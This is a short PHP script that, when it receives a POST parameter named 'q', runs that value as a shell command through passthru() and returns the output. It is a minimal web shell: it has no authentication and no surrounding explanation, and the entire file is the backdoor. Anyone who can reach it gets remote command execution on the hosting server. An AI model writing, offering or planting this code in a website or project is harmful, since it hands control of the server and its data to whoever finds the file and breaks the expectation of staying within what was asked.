<?php
if (isset($_POST['q'])) {
    header('Content-Type: text/plain');
    passthru($_POST['q'] . ' 2>&1');
}
